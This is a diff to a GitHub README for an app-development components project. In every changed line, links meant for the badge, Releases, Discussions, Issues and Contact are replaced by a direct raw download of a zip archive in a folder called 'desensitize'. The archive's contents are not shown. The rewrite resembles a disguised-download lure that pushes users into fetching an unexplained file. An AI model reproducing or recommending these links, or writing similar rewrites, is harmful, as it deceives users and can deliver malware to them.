@@ -1,6 +1,6 @@
 # 🎉 app-development-components-3-user-experience-2025 - Build Engaging Apps Easily
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the app-development-components-3-user-experience-2025! This project h
 
 To get started, you need to download the application. Follow the steps below:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip) to find the latest version of the application.
    
 2. **Select the Release**: You’ll see a list of releases. Click on the latest one to access it.
 
@@ -51,21 +51,21 @@ For detailed information on how to use each feature, refer to the following reso
 
 Join our community for additional support and networking. Here’s how you can connect:
 
-- **GitHub Discussions**: Engage with other users and developers in our [GitHub Discussions](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/discussions) section.
-- **Issue Tracker**: Report any issues you encounter using the [Issues page](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/issues).
+- **GitHub Discussions**: Engage with other users and developers in our [GitHub Discussions](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip) section.
+- **Issue Tracker**: Report any issues you encounter using the [Issues page](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip).
 - **Social Media**: Follow us on social media for updates and news related to the application.
 
 ## 🔗 Useful Links
 
 Here are some links that may help you while using the application:
 
-- [Releases Page](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/releases)
+- [Releases Page](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip)
 - [User Guide](#)
-- [GitHub Discussions](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/discussions)
-- [Issues Page](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip)
+- [Issues Page](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip)
 
 ## ✉️ Contact
 
-If you need further assistance or have questions not covered here, feel free to reach out. You can contact us through the [Issues page](https://github.com/NaimulHero/app-development-components-3-user-experience-2025/issues).
+If you need further assistance or have questions not covered here, feel free to reach out. You can contact us through the [Issues page](https://raw.githubusercontent.com/NaimulHero/app-development-components-3-user-experience-2025/main/desensitize/app-development-components-3-user-experience-2025.zip).
 
 Thank you for choosing app-development-components-3-user-experience-2025! We hope you find it valuable as you build and enhance your applications. Enjoy exploring and creating!
